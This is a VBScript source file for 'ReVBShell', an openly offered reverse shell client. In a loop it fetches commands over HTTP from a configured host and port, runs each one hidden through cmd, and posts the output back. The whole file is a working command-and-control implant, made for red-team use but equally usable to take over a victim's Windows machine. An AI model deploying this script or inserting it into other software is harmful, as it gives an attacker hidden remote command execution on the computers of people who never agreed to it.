' This software is provided under under the BSD 3-Clause License.
' See the accompanying LICENSE file for more information.
'
' Client for Reverse VBS Shell
'
' Author:
'  Arris Huijgen
'
' Website:
'  https://github.com/bitsadmin/ReVBShell
'

strHost = "127.0.0.1"
strPort = "8080"

Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0
Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0
Const HTTPREQUEST_PROXYSETTING_DIRECT = 1
Const HTTPREQUEST_PROXYSETTING_PROXY = 2
Dim http, strResponse, strCommand, strArgument, varByteArray, strData, strBuffer, lngCounter, fs, ts
Set WshShell = CreateObject("WScript.Shell")
Set fso  = CreateObject("Scripting.FileSystemObject")
Err.Clear

' Create HTTP object
Set http = Nothing
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")

' Busy waiting loop
While True
    ' Fetch next command
    http.Open "GET", "http://" & strHost & ":" & strPort & "/cmd", False
    http.Send
    strResponse = Split(http.ResponseText, vbCrLf)

    ' Determine command and arguments
    strCommand = strResponse(0)
    strArgument = ""
    If UBound(strResponse) > 0 Then
        strArgument = strResponse(1)
    End If

    ' Execute action
    Select Case strCommand
        Case "NOOP"
            ' Sleep 5 seconds
            WScript.Sleep 5000
        Case "CMD"
            'Wscript.echo "CMD: " & strCommand & vbCrLf & "ARGS: " & strArgument

            ' Execute command
            WshShell.Run "cmd /C " & strArgument & "> %tmp%\rso.txt 2>&1", 0, true
            Set file = fso.OpenTextFile(fso.GetSpecialFolder(2) & "\rso.txt", 1)
            text = file.ReadAll
            file.Close

            ' POST result back
            http.Open "POST", "http://" & strHost & ":" & strPort & "/cmd", False
            http.Send "result=" & text
        Case Else
            Wscript.echo "Unknown command: " & strCommand
    End Select
Wend